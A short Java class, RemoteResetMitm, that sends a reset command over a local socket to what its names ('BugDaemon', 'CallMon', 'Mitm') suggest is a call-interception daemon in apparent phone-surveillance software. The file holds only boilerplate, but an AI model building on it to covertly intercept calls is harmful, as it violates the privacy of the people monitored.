package com.vvt.callmanager.ref.command;

import com.fx.socket.SocketCmd;
import com.vvt.callmanager.ref.BugDaemonResource;

public class RemoteResetMitm extends SocketCmd<String, Boolean> {
	
	private static final long serialVersionUID = -7591749533717397474L;
	
	private static final String TAG = "RemoteResetMitm";
	private static final String SERVER_NAME = BugDaemonResource.CallMon.SOCKET_NAME;

	public RemoteResetMitm() {
		super(null, Boolean.class);
	}

	@Override
	protected String getTag() {
		return TAG;
	}

	@Override
	protected String getServerName() {
		return SERVER_NAME;
	}

}
